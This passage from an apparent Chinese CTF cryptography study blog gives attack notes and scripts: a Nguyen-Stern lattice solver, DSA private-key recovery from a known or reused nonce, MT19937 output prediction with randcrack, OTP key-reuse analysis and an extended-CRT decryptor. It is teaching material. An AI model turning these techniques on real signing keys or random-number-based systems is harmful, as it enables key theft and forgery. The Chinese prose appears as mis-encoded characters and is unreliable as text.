å…³çš„è¡Œå‘é‡ä¸ªæ•°ã€‚</p></li><li><p><strong>å³0ç©ºé—´ï¼š</strong> æ»¡è¶³$\vec{x}A&#x3D;\vec{0}$çš„æ‰€æœ‰$\vec{x}$æ„æˆçš„é›†åˆï¼Œåœ¨sagemathä¸­ä¸ºÂ <code>A.right_kernel().matrix()</code>ã€‚å…¶ä¸ªæ•°ä¸º$n-r+1$ï¼Œ$r$ä¸º$A$ä¸­äº’ç›¸çº¿æ€§æ— å…³çš„åˆ—å‘é‡ä¸ªæ•°ã€‚</p></li></ul><blockquote><p><strong>æ€§è´¨ï¼š</strong> <strong>è¡Œç©ºé—´</strong>å’Œ<strong>å³0ç©ºé—´</strong>æ­£äº¤ï¼Œ<strong>åˆ—ç©ºé—´</strong>å’Œ<strong>å·¦0ç©ºé—´</strong>æ­£äº¤ã€‚</p></blockquote><p> <strong>é—®é¢˜è§£æ³•ï¼š</strong></p><ul><li><p>å¯¹å·²çŸ¥ç»™å®šçš„å‘é‡$\vec{h} \mod M$ï¼Œé¦–å…ˆæ‰¾ä¸$\vec{h}$å‚ç›´çš„$m-n$ä¸ªçŸ­å‘é‡$\vec{\mu_i}$</p></li><li><p>ä½¿ç”¨$\mu_i$æ„é€ æ ¼$L_{\frac{1}{x}}$ï¼Œç”¨$L_{\frac{1}{x}}$æ‰¾åˆ°$L_x$çš„æ­£äº¤è¡¥$\overline{L_x}$</p></li><li><p>å¯¹$\overline{L_x}$ä½¿ç”¨BKZæ¢å¤$x_i$</p></li></ul><p> <strong>å‚è€ƒä»£ç ï¼š</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æ­£äº¤æ ¼</span><br><span class="hljs-keyword">import</span> logging<br>logging.basicConfig(<br>    level=logging.DEBUG,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;[%(levelname)s] %(message)s&quot;</span><br>)<br><br><span class="hljs-comment"># https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage</span><br><span class="hljs-comment"># faster LLL reduction to replace `M.LLL()` wiith `flatter(M)`</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flatter</span>(<span class="hljs-params">M, **kwds</span>):<br>    <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> check_output<br>    <span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> findall<br>    M = matrix(ZZ,M)<br>    <span class="hljs-comment"># compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH</span><br>    z = <span class="hljs-string">&#x27;[[&#x27;</span> + <span class="hljs-string">&#x27;]\n[&#x27;</span>.join(<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,row)) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> M) + <span class="hljs-string">&#x27;]]&#x27;</span><br>    ret = check_output([<span class="hljs-string">&quot;flatter&quot;</span>], <span class="hljs-built_in">input</span>=z.encode())<br>    <span class="hljs-keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,findall(<span class="hljs-string">b&#x27;-?\\d+&#x27;</span>, ret)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkMatrix</span>(<span class="hljs-params">M, wl=[-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span>):<br>    M = [<span class="hljs-built_in">list</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(M)]<br>    ml = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(flatten(M)))<br>    logging.debug(ml)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(ml) == <span class="hljs-built_in">sorted</span>(wl)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Nguyen_Stern</span>(<span class="hljs-params">h, m, n, M</span>):<br>    B = matrix(ZZ, m)<br>    B[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = M<br>    h0i = Integer(h[<span class="hljs-number">0</span>]).inverse_mod(M)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        B[i, <span class="hljs-number">0</span>] = - h[i] * h0i<br>        B[i, i] = <span class="hljs-number">1</span><br>    <span class="hljs-comment">#L = B.BKZ()    # slooooooow</span><br>    L = flatter(B)<br>    logging.info(<span class="hljs-string">&#x27;flatter done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    vh = vector(Zmod(M), h)</span><br><span class="hljs-string">    logging.debug([vector(Zmod(M), list(l)) * vh  for l in L])</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    Lxo = matrix(ZZ, L[:m-n])<br>    Lxc = Lxo.right_kernel(algorithm=<span class="hljs-string">&#x27;pari&#x27;</span>).matrix() <span class="hljs-comment"># faster</span><br>    logging.info(<span class="hljs-string">&#x27;right_kernel done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X])</span><br><span class="hljs-string">        rsc = Lxc.row_space()</span><br><span class="hljs-string">        logging.debug([xi in rsc for xi in Lx_real])</span><br><span class="hljs-string">    except:</span><br><span class="hljs-string">        pass</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    e = matrix(ZZ, [<span class="hljs-number">1</span>] * m)<br>    B = block_matrix([[-e], [<span class="hljs-number">2</span>*Lxc]])<br>    Lx = B.BKZ()<br>    logging.info(<span class="hljs-string">&#x27;BKZ done.&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> checkMatrix(Lx)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(Lx[<span class="hljs-number">0</span>])) == <span class="hljs-number">1</span><br><br>    Lx = Lx[<span class="hljs-number">1</span>:]<br>    E = matrix(ZZ, [[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.ncols())] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.nrows())])<br>    Lx = (Lx + E) / <span class="hljs-number">2</span><br><br>    Lx2 = []<br>    e = vector(ZZ, [<span class="hljs-number">1</span>] * m)<br>    rsc = Lxc.row_space()<br>    <span class="hljs-keyword">for</span> lx <span class="hljs-keyword">in</span> Lx:<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        lx = e - lx<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        logging.warning(<span class="hljs-string">&#x27;Something wrong?&#x27;</span>)<br>    Lx = matrix(Zmod(M), Lx2)<br><br>    vh = vector(Zmod(M), h)<br>    va = Lx.solve_left(vh)<br>    <span class="hljs-keyword">return</span> Lx, va<br><br>m = <span class="hljs-number">200</span><span class="hljs-comment">#xæ˜¯nä¸ªmç»´å‘é‡ç»„æˆ</span><br>n = <span class="hljs-number">100</span><span class="hljs-comment">#næ˜¯x_iå’Œa_içš„ä¸ªæ•°</span><br>M =    <span class="hljs-comment">#æ¨¡æ•°</span><br>h =    <span class="hljs-comment">#ç»™å®šçš„æœ€ç»ˆå‘é‡h</span><br><br>Lx, va = Nguyen_Stern(h, m, n, M)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å‘é‡a:&quot;</span>,va)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;çŸ©é˜µx:&quot;</span>,Lx)<br></code></pre></td></tr></table></figure><p> ï¼ˆä»£ç è¿™é‡Œå…ˆå·äº†ï¼Œåç»­ä¼šè‡ªå·±å®ç°çš„qwqï¼‰</p><blockquote><p><strong>é™„ä¸ŠArch Linuxå®‰è£…flatteræ­¥éª¤ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> pacman -S gmp mpfr eigen base-devel gcc git cmake<br>git <span class="hljs-built_in">clone</span> https://github.com/keeganryan/flatter.git<br><span class="hljs-built_in">cd</span> flatter<br><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> ./build<br>cmake -DCMAKE_INSTALL_PREFIX=/usr ..<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure></blockquote><h2 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h2><h3 id="å¯†é’¥ç”Ÿæˆ"><a href="#å¯†é’¥ç”Ÿæˆ" class="headerlink" title="å¯†é’¥ç”Ÿæˆ"></a>å¯†é’¥ç”Ÿæˆ</h3><ul><li><p>é€‰æ‹©ä¸€ä¸ªå“ˆå¸Œå‡½æ•°ï¼ˆé€šå¸¸ä¸ºSHA1ï¼‰</p></li><li><p>é€‰æ‹©å¯†é’¥é•¿åº¦<strong>L</strong>å’Œ<strong>N</strong></p></li><li><p>é€‰æ‹©Næ¯”ç‰¹çš„ç´ æ•°q</p></li><li><p>é€‰æ‹©Læ¯”ç‰¹çš„ç´ æ•°pï¼Œä½¿p-1æ˜¯qçš„å€æ•°</p></li><li><p>é€‰æ‹©gï¼Œä½¿æ»¡è¶³$g^k\equiv 1\ mod p$ çš„æœ€å°æ­£æ•´æ•°kä¸ºqã€‚å¯ç”¨$g&#x3D;h^{\frac {p-1}{q}}$æ¥è·å¾—gï¼Œå…¶ä¸­1 &lt; h &lt;p-1</p></li><li><p>é€‰æ‹©ç§é’¥xï¼Œ0 &lt; x &lt; q,è®¡ç®—$y\equiv g^x \mod p$</p></li></ul><blockquote><p>å…¬é’¥ä¸º <strong>ï¼ˆpï¼Œqï¼Œgï¼Œyï¼‰</strong> ï¼Œç§é’¥ä¸º <strong>ï¼ˆxï¼‰</strong> </p></blockquote><h3 id="ç­¾å"><a href="#ç­¾å" class="headerlink" title="ç­¾å"></a>ç­¾å</h3><ul><li><p>é€‰æ‹©éšæœºæ•´æ•°kä½œä¸ºä¸´æ—¶å¯†é’¥ï¼Œ0&lt;k&lt; q</p></li><li><p>è®¡ç®—$r\equiv(g^k \mod p)\mod q$</p></li><li><p>è®¡ç®—$s\equiv(H(m)+xr)k^{-1}\mod q$</p></li></ul><blockquote><p>ç­¾åç»“æœä¸º <strong>ï¼ˆrï¼Œsï¼‰</strong> ï¼Œä¸Elgamal ä¸åŒï¼Œè¿™é‡Œä½¿ç”¨äº†å“ˆå¸Œå‡½æ•°å¯¹æ¶ˆæ¯è¿›è¡Œäº†å“ˆå¸Œå¤„ç†ã€‚</p></blockquote><h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><ul><li><p>è®¡ç®—è¾…åŠ©å€¼$w&#x3D;s^{-1}\mod q$</p></li><li><p>è®¡ç®—è¾…åŠ©å€¼$u_1&#x3D;H(m)w\mod q$</p></li><li><p>è®¡ç®—è¾…åŠ©å€¼$u_2&#x3D;rw\mod q$</p></li><li><p>è®¡ç®—$v&#x3D;(g^{u_1}y^{u_2}\mod p)\mod q$</p></li><li><p>æ£€éªŒ$v$å’Œ$r$æ˜¯å¦ç›¸ç­‰ã€‚</p></li></ul><h3 id="æ”»å‡»æ–¹æ³•"><a href="#æ”»å‡»æ–¹æ³•" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h3><h4 id="1-å·²çŸ¥k"><a href="#1-å·²çŸ¥k" class="headerlink" title="1.å·²çŸ¥k"></a>1.å·²çŸ¥k</h4><ul><li><p>åˆ©ç”¨$s\equiv(H(m)+xr)k^{-1}\mod q$</p></li><li><p>å¯ä»¥è®¡ç®—$x\equiv(ks-H(m))r^{-1}\mod q$</p></li></ul><h4 id="2-kå…±äº«"><a href="#2-kå…±äº«" class="headerlink" title="2.kå…±äº«"></a>2.kå…±äº«</h4><ul><li>å·²çŸ¥ä¸¤æ¬¡ç­¾åç”¨äº†ç›¸åŒçš„kï¼Œå³</li></ul> <span>   $$s_1\equiv(H(m_1)+xr)k^{-1}\mod q  \\s_2\equiv(H(m_2)+xr)k^{-1}\mod q   $$   </span> <ul><li>ä¸¤å¼ç›¸å‡ï¼Œå¾—</li></ul><span>$$k(s_1-s_2)\equiv H(m_1)-H(m_2)\mod q \\k\equiv (H(m_1)-H(m_2))(s_1-s_2)^{-1}\mod q$$</span>   <p>å¾—åˆ°kåï¼ŒåŒä¸Šè§£å‡ºxã€‚</p><h1 id="bytes-to-longå‡½æ•°æ¢ç©¶"><a href="#bytes-to-longå‡½æ•°æ¢ç©¶" class="headerlink" title="bytes_to_longå‡½æ•°æ¢ç©¶"></a>bytes_to_longå‡½æ•°æ¢ç©¶</h1><p> <strong>ç”¨é€”ï¼š</strong> å°†å­—èŠ‚åºåˆ—è½¬æ¢æˆé•¿æ•´æ•°ã€‚</p><p> <strong>è½¬æ¢è¿‡ç¨‹ï¼š</strong> æ¯ä¸ªå­—èŠ‚è¢«è§£é‡Šä¸ºä¸€ä¸ª<strong>8ä½</strong>æ— ç¬¦å·æ•´æ•°ï¼Œä»æœ€ä½ä½åˆ°æœ€é«˜ä½é€å­—èŠ‚ç´¯åŠ ï¼Œæ¯å‘å·¦ç§»åŠ¨ä¸€ä½ï¼Œæ•°å€¼ä¹˜ä»¥$2^8(å³256)$ã€‚</p><p> ï¼ˆå…¶å®åº”è¯¥ç­‰ä»·äºæŠŠå­—èŠ‚è½¬æ¢æˆ8ä½äºŒè¿›åˆ¶æ‹¼æ¥ï¼Œç„¶åè½¬æ¢æˆåè¿›åˆ¶ï¼‰</p><p> <strong>ç¤ºä¾‹ï¼š</strong><code>b&#39;\x01\x02\x03</code>è½¬æ¢è¿‡ç¨‹å¦‚ä¸‹</p> <span> $$ 0x01 \times 256^2 + 0x02\times 256^1+0x03\times 256^0 $$ </span> <h2 id="æµå¯†ç "><a href="#æµå¯†ç " class="headerlink" title="æµå¯†ç "></a>æµå¯†ç </h2><p><strong>æ¦‚å¿µï¼š</strong> ä»¥æœ€å°å•ä½<strong>æ¯”ç‰¹</strong>ä½œä¸ºä¸€æ¬¡åŠ å¯†ã€è§£å¯†çš„æ“ä½œå…ƒç´ ã€‚ç›®å‰éƒ½æ˜¯å¯¹ç§°åŠ å¯†ã€‚</p><p> <strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li><p>æµå¯†ç çš„å¯†é’¥æ´¾ç”Ÿè‡ªä¸€ä¸ªè¾ƒçŸ­çš„å¯†é’¥ï¼Œæ´¾ç”Ÿç®—æ³•é€šå¸¸ä¸ºä¸€ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ã€‚</p></li><li><p>æµå¯†ç çš„å¯†é’¥é•¿åº¦ä¼šä¸æ˜æ–‡é•¿åº¦ç›¸åŒã€‚</p></li></ul><p> <strong>å…³é”®ï¼š</strong> åœ¨äºè®¾è®¡å¥½çš„<strong>ä¼ªéšæœºæ•°ç”Ÿæˆå™¨</strong>ï¼Œå…¶åŸºæœ¬æ„é€ æ¨¡å—ä¸ºåé¦ˆç§»ä½å¯„å­˜å™¨(FSR)ã€‚</p><h1 id="ä¼ªéšæœºæ•°ç”Ÿæˆå™¨-PRNG"><a href="#ä¼ªéšæœºæ•°ç”Ÿæˆå™¨-PRNG" class="headerlink" title="ä¼ªéšæœºæ•°ç”Ÿæˆå™¨(PRNG)"></a>ä¼ªéšæœºæ•°ç”Ÿæˆå™¨(PRNG)</h1><p> <strong>åˆ«ç§°ï¼š</strong> ç¡®å®šæ€§éšæœºä½ç”Ÿæˆå™¨ï¼ˆDRBGï¼‰</p><p> <strong>ç”¨é€”ï¼š</strong> ç”¨æ¥ç”Ÿæˆæ¥è¿‘ç»å¯¹éšæœºæ•°åºåˆ—çš„æ•°å­—åºåˆ—çš„ç®—æ³•ã€‚</p><p> <strong>ä¸»è¦ç±»å‹ï¼š</strong></p><ul><li><p>çº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼ˆLCGï¼‰</p><blockquote><p>è§åšå®¢æ–‡ç« ã€ŠCryptoåŸºç¡€ç¯‡-LCGã€‹</p></blockquote></li><li><p>çº¿æ€§å›å½’å‘ç”Ÿå™¨</p></li><li><p>Mersenne Twister</p></li><li><p>xorshift generators</p></li><li><p>WELL family of generators</p></li><li><p>çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆLFSRï¼‰</p></li></ul><h1 id="LFSRçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨"><a href="#LFSRçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨" class="headerlink" title="LFSRçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨"></a>LFSRçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨</h1><p> <strong>ç”¨é€”ï¼š</strong> ç”¨äºäº§ç”Ÿ<strong>ä¼ªéšæœºæ•°</strong>ã€‚</p><p> <strong>æ¦‚å¿µï¼š</strong> LFSRæ˜¯åé¦ˆå¯„å­˜å™¨ä¸­çš„ä¸€ç§ï¼Œå¦ä¸€ç§ä¸ºNFSRï¼ˆéçº¿æ€§åé¦ˆå¯„å­˜å™¨ï¼‰ã€‚</p><p> <strong>ç»“æ„ï¼š</strong></p><p><img src="/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/file-20250402175359931.png"></p><blockquote><p>psï¼šè‹¥åé¦ˆå‡½æ•°æ˜¯çº¿æ€§çš„ï¼Œåˆ™å…¶æˆä¸º<strong>çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨</strong>ï¼ˆLFSRï¼‰</p></blockquote><p> <strong>è¿‡ç¨‹è¡¨ç¤ºï¼š</strong><br><img src="/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/file-20250402175431141.png"></p><h1 id="Pythonä¸­çš„randomå‡½æ•°ï¼ˆMT19937ï¼‰"><a href="#Pythonä¸­çš„randomå‡½æ•°ï¼ˆMT19937ï¼‰" class="headerlink" title="Pythonä¸­çš„randomå‡½æ•°ï¼ˆMT19937ï¼‰"></a>Pythonä¸­çš„randomå‡½æ•°ï¼ˆMT19937ï¼‰</h1><p><strong>ä»‹ç»ï¼š</strong> pythonå†…ç½®çš„randomæ–¹æ³•ä½¿ç”¨çš„æ˜¯<strong>æ¢…æ£®æ—‹è½¬ç®—æ³•MT19937</strong>ï¼Œæœ€é•¿å‘¨æœŸä¸ºä¸€ä¸ªæ¢…æ£®ç´ æ•°$2^{19937} -1$ ã€‚å¹¶ä¸”åœ¨Pythonä¸­æ˜¯åŸºäº32ä½çš„<strong>MT19937-32</strong>.<br><strong>æ”»å‡»æ–¹æ³•ï¼š</strong><br>ä½¿ç”¨<strong>randcrackåº“</strong>è¿›è¡Œé¢„æµ‹ï¼Œä½¿ç”¨æ–¹æ³•ä¹Ÿéå¸¸ç®€å•ï¼Œ<br>åªéœ€å°†å‰624ä¸ª32bitçš„randomç”Ÿæˆçš„éšæœºæ•°æäº¤ç»™randcrackï¼Œä¾¿å¯ä»¥é¢„æµ‹ä¹‹åçš„éšæœºæ•°ã€‚<br><strong>ä»£ç å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><br>rc = RandCrack()<br>arr=[] <span class="hljs-comment">#å·²çŸ¥çš„624ä¸ª32bitéšæœºæ•°</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:<br>rc.submit(i)<br><br>rand_next = rc.predict_getrandbits(<span class="hljs-number">10000</span>) <span class="hljs-comment">#æ”¹æˆè‡ªå·±æ‰€éœ€è¦çš„ä½æ•°</span><br><span class="hljs-built_in">print</span>(rand_next)<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šæƒ…å†µï¼š</strong> å¦‚æœåªæœ‰312ä¸ª64bitçš„randomæ•°å‘¢ï¼Ÿ<br>é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç†è§£randomåº“ç”Ÿæˆéšæœºæ•°çš„æœ¬è´¨ï¼Œ<br>å½¢è±¡çš„æ¥è¯´ï¼Œæ¯ä¸ªéšæœºæ•°éƒ½æ˜¯ä»ä¸€ä¸ªé•¿bitæ•°çš„ä½ä½<strong>åˆ‡å‰²</strong>ä¸‹æ¥å¾—åˆ°çš„ã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœç§å­æ•°ç›¸åŒï¼Œ<br>ç¬¬ä¸€ä¸ªåºåˆ—ç”Ÿæˆä¸€ä¸ª64bitæ•°ï¼Œ<br>ç¬¬äºŒä¸ªåºåˆ—ç”Ÿæˆä¸¤ä¸ª32bitæ•°ï¼Œ<br>ç»“æœä¼šæ€æ ·å‘¢ï¼Œäº‹å®ä¾¿æ˜¯ä¸¤ä¸ª32bitæ•°æŒ‰ç…§å…ˆç”Ÿæˆçš„åœ¨ä½ä½ï¼Œåç”Ÿæˆçš„åœ¨é«˜ä½æ‹¼æ¥ï¼Œå°±ä¼šå¾—åˆ°è¿™ä¸ª64bitæ•°ã€‚<br><strong>æ€»ç»“ï¼š</strong> å³ä½¿åªæœ‰312ä¸ª64bitæ•°ï¼Œå°†å…¶æ‹†åˆ†æˆ624ä¸ª32bitæ•°ä¹‹åï¼Œä»ç„¶èƒ½å¤Ÿè¿›è¡Œé¢„æµ‹ï¼Œå…¶ä»–é•¿åº¦ä¹ŸåŒç†ï¼Œåªè¦é•¿åº¦æ€»å’Œè¾¾åˆ°624Ã—32å°±å¯ä»¥é¢„æµ‹ã€‚</p><h1 id="ç®€å•çš„OTPï¼ˆä¸€æ¬¡ä¸€å¯†ï¼‰"><a href="#ç®€å•çš„OTPï¼ˆä¸€æ¬¡ä¸€å¯†ï¼‰" class="headerlink" title="ç®€å•çš„OTPï¼ˆä¸€æ¬¡ä¸€å¯†ï¼‰"></a>ç®€å•çš„OTPï¼ˆä¸€æ¬¡ä¸€å¯†ï¼‰</h1><p><strong>ä»‹ç»ï¼š</strong> æ˜æ–‡ã€å¯†é’¥ã€å¯†æ–‡é•¿åº¦å‡ç›¸åŒ<br><strong>åˆ†æï¼š</strong> å·²çŸ¥æ˜æ–‡ã€å¯†æ–‡ï¼Œå¯é€šè¿‡å¼‚æˆ–è·å¾—å¯†é’¥ï¼Œå¦‚æœå¯†é’¥å¤ç”¨ï¼Œä¾¿å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚</p><h1 id="æ‰©å±•ä¸­å›½å‰©ä½™å®šç†ï¼ˆexCRTï¼‰"><a href="#æ‰©å±•ä¸­å›½å‰©ä½™å®šç†ï¼ˆexCRTï¼‰" class="headerlink" title="æ‰©å±•ä¸­å›½å‰©ä½™å®šç†ï¼ˆexCRTï¼‰"></a>æ‰©å±•ä¸­å›½å‰©ä½™å®šç†ï¼ˆexCRTï¼‰</h1><p><strong>ç®€ä»‹ï¼š</strong> è§£å†³CRTæ¨¡æ•°ä¸äº’ç´ çš„æƒ…å†µ<br><strong>è„šæœ¬ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exgcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> b==<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    x, y = exgcd(b, a%b)<br>    <span class="hljs-keyword">return</span> y, x - a//b*y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uni</span>(<span class="hljs-params">P, Q</span>):<br>    r1, m1 = P<br>    r2, m2 = Q<br><br>    d = gmpy2.gcd(m1, m2)<br>    <span class="hljs-keyword">assert</span> (r2-r1) % d == <span class="hljs-number">0</span><br><br>    l1, l2 = exgcd(m1//d, m2//d)<br>    <br>    <span class="hljs-keyword">return</span> (r1 + (r2-r1)//d*l1*m1) % gmpy2.lcm(m1, m2), gmpy2.lcm(m1, m2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CRT</span>(<span class="hljs-params">eq</span>):<br>    <span class="hljs-keyword">return</span> reduce(uni, eq)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    <br>    ms = [...]   <span class="hljs-comment">#æ¨¡æ•°</span><br>    cs = [...]   <span class="hljs-comment">#å¯†æ–‡</span><br>    m, mod = CRT(<span class="hljs-built_in">zip</span>(cs, ms))<br>    ans = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><p><strong>å‚è€ƒï¼š</strong> <a href="https://www.ruanx.net/excrt/">æ‰©å±•ä¸­å›½å‰©ä½™å®šç†</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Miscéšç¬”</title>
    <link href="/2025/02/28/Misc%E9%9A%8F%E7%AC%94/"/>
    <url>/2025/02/28/Misc%E9%9A%8F%E7%AC%94/</url>
    
